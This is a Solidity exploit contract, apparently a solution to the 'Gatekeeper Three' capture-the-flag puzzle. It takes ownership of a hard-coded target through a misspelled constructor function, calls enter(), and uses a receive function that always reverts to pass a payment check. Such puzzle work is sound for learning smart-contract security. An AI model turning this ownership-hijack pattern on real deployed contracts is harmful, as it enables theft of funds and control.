// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function owner() external view returns(address);
    function entrant() external view returns(address);
    function trick() external view returns(address);
    function allowEntrance() external view returns(bool);

    function construct0r() external;

    function createTrick() external;
    function getAllowance(uint256 _password) external;

    function enter() external;
}

contract Exp {
    IGatekeeperThree gate = IGatekeeperThree(0xbE5B62a1b69FA3e27fAa1047651eD153329420a3);

    function run1() external {
        gate.construct0r();
    }

    function run2() external {
        gate.enter();
    }

    receive() external payable {
        revert();
    }
}
